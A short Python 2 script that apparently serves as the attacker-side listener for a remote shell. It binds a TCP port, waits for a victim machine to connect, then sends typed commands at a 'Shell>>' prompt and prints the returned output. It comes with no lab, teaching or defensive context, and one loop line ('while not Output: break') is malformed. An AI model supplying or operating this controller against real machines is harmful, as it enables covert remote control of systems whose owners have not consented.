import socket
TCP_IP = "192.168.0.10"
TCP_PORT = 4334
BUFFER_SIZE = 1024
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((TCP_IP, TCP_PORT))
s.listen(2)
print "Listening On " + TCP_IP + ":" + str(TCP_PORT)
conn, addr = s.accept()
print "Shell Opened From " + addr[0]
while 1:
	Command = raw_input("Shell>> ")
	conn.send(Command)
	Output = conn.recv(BUFFER_SIZE)
	while not Output: break
	print Output
conn.close()